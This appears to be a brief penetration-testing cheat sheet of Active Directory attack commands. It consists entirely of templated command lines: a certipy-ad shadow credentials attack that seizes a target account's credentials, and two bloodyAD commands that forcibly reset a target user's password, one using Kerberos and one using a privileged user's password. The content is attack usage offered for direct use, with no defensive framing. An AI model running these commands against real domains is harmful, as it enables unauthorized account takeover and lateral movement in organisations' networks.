Get shadow credentials of target account:
```
certipy-ad shadow auto -username <username>@<domain> -p <password> -account <targetAccount>
```

Reset target user password using Kerberos authentication and TLS (-s):
```
bloodyAD --host <ip> -d <domain> -k -s set password <target> <newPass>
```

Reset target user password using username and password of privileged user:
```
bloodyAD --host <ip> -d <domain> -u <username> -p <password> set password <target> <newPass>
```

